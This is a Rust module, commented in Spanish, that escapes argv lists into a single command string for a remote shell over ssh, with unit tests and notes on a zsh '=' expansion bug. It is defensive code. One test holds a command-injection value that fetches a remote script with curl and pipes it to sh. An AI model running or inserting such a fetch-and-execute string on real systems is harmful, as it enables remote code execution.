//! Escapado de argumentos para una orden remota.
//!
//! Es la pieza de la que depende que el nombre de una app no se convierta en un
//! comando, y por eso está sola en su módulo y tiene una prueba de propiedad
//! detrás.
//!
//! **El problema, con precisión.** Cuando se ejecuta `ssh host 'comando'`, el
//! argumento remoto *no* se le pasa a un `execve`: `sshd` se lo entrega al shell
//! de login del usuario remoto, que lo interpreta. Siempre hay un shell al otro
//! lado, y no hay forma de decirle a `ssh` «esto son argumentos separados».
//! Peor: OpenSSH **concatena con espacios** los argumentos que le sobran, así
//! que pasarle un argv «separado» al binario `ssh` no separa nada — construye
//! una cadena y hace creer que no.
//!
//! **La propiedad que sostiene todo:** para cualquier lista de cadenas,
//! `argv → build → shell remoto → argv` es la identidad. Se comprueba contra
//! `bash`, `dash`, `zsh` y `busybox ash`, porque **el shell de login del usuario
//! remoto no lo elegimos nosotros**.
//!
//! **Y `printf %q` de bash no vale**, aunque sea lo primero que uno piensa:
//! produce `$'\n'` para un salto de línea, que es sintaxis de bash y `dash` no
//! entiende. Un escapador portable entrecomilla en simples y punto.

/// Los caracteres que pueden viajar sin comillas.
///
/// Es deliberadamente estrecho, y esa estrechez costó un fallo real: con `=`
/// dentro, zsh expande las palabras que empiezan por `=` (opción `EQUALS`:
/// `=ls` se sustituye por la ruta de `ls`), así que el argumento `=Y` volvía
/// como `zsh:1: Y not found`. `bash`, `dash` y `busybox` pasaban los 2.529
/// casos; sólo zsh falló. Es el modo de fallo exacto contra el que existe la
/// prueba: correcto en el shell donde se desarrolla, roto en el que usa el
/// usuario.
///
/// El arreglo no fue prohibir un carácter —una lista negra crece cada vez que
/// alguien encuentra uno nuevo, que es la firma de que el diseño estaba mal—
/// sino estrechar esto. **Cada carácter que se añada aquí es una regla de
/// expansión de cuatro shells que hay que conocer. Entrecomillar de más no
/// cuesta nada; entrecomillar de menos es una ejecución de comandos.**
fn es_seguro(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '/' | '-')
}

/// Lo que puede salir mal al construir una orden. Son dos casos y los dos son
/// del programa que llama, no del usuario.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ErrorEscapado {
    /// Un byte nulo no puede viajar en un `argv`. Se **rechaza**, no se escapa:
    /// fingir que sí es peor que fallar.
    ByteNulo,
    /// Un comando sin argumentos no es un comando.
    Vacio,
}

impl std::fmt::Display for ErrorEscapado {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ByteNulo => write!(f, "un argumento no puede contener un byte nulo"),
            Self::Vacio => write!(f, "una orden remota necesita al menos un argumento"),
        }
    }
}

impl std::error::Error for ErrorEscapado {}

/// Entrecomilla una cadena para un shell POSIX.
pub fn shquote(s: &str) -> Result<String, ErrorEscapado> {
    if s.contains('\0') {
        return Err(ErrorEscapado::ByteNulo);
    }
    if s.is_empty() {
        return Ok("''".to_string());
    }
    if s.chars().all(es_seguro) {
        return Ok(s.to_string());
    }
    // Comillas simples, y las internas se cierran, se escapan y se reabren.
    // Dentro de comillas simples un shell POSIX no interpreta absolutamente
    // nada, que es justo la propiedad que hace falta.
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    Ok(out)
}

/// Serializa un `argv` en la cadena que se le entrega al shell remoto.
///
/// Es el **único** sitio de todo el código donde una lista de argumentos se
/// convierte en una cadena de comando. Que sea uno solo es media mitigación:
/// un `argv` construido a mano en veinte sitios se equivoca en el sitio
/// diecinueve, y equivocarse aquí significa concatenar.
pub fn build(argv: &[impl AsRef<str>]) -> Result<String, ErrorEscapado> {
    if argv.is_empty() {
        return Err(ErrorEscapado::Vacio);
    }
    let mut partes = Vec::with_capacity(argv.len());
    for a in argv {
        partes.push(shquote(a.as_ref())?);
    }
    Ok(partes.join(" "))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lo_inocuo_viaja_sin_comillas() {
        assert_eq!(shquote("mi-web").unwrap(), "mi-web");
        assert_eq!(
            shquote("/usr/local/bin/orbit").unwrap(),
            "/usr/local/bin/orbit"
        );
        assert_eq!(shquote("20260805-041230").unwrap(), "20260805-041230");
    }

    #[test]
    fn la_cadena_vacia_es_un_argumento() {
        // Y tiene que seguir siéndolo al otro lado: '' es un argumento vacío,
        // no la ausencia de uno.
        assert_eq!(shquote("").unwrap(), "''");
    }

    #[test]
    fn la_comilla_simple_se_cierra_y_se_reabre() {
        assert_eq!(shquote("a'b").unwrap(), r#"'a'\''b'"#);
    }

    #[test]
    fn el_igual_se_entrecomilla_por_zsh() {
        // La regresión del fallo que encontró la prueba de propiedad. Sin esto,
        // zsh expande '=Y' y devuelve «Y not found».
        assert_eq!(shquote("=Y").unwrap(), "'=Y'");
        assert_eq!(shquote("A=1").unwrap(), "'A=1'");
    }

    #[test]
    fn la_tilde_se_entrecomilla() {
        // Si no, el shell remoto la expande al $HOME del usuario remoto y el
        // argumento deja de ser el que se mandó.
        assert_eq!(shquote("~").unwrap(), "'~'");
    }

    #[test]
    fn un_byte_nulo_se_rechaza_no_se_escapa() {
        assert_eq!(shquote("a\0b"), Err(ErrorEscapado::ByteNulo));
    }

    #[test]
    fn una_orden_sin_argumentos_no_es_una_orden() {
        let vacio: [&str; 0] = [];
        assert_eq!(build(&vacio), Err(ErrorEscapado::Vacio));
    }

    #[test]
    fn una_orden_de_verdad() {
        let argv = ["/usr/local/bin/orbit", "deploy", "mi-web", "--json"];
        assert_eq!(
            build(&argv).unwrap(),
            "/usr/local/bin/orbit deploy mi-web --json"
        );
    }

    #[test]
    fn una_inyeccion_no_sobrevive_al_escapado() {
        let argv = ["/usr/local/bin/orbit", "info", "a'; curl x.sh|sh; '"];
        let linea = build(&argv).unwrap();
        // Lo que importa no es cómo queda, sino que el shell lo devuelva como
        // UN argumento. Eso lo comprueba la prueba de propiedad de
        // tests/escapado.rs contra cuatro shells de verdad; aquí sólo se fija
        // que no se cuela una comilla sin cerrar.
        assert_eq!(linea.matches('\'').count() % 2, 0);
    }
}
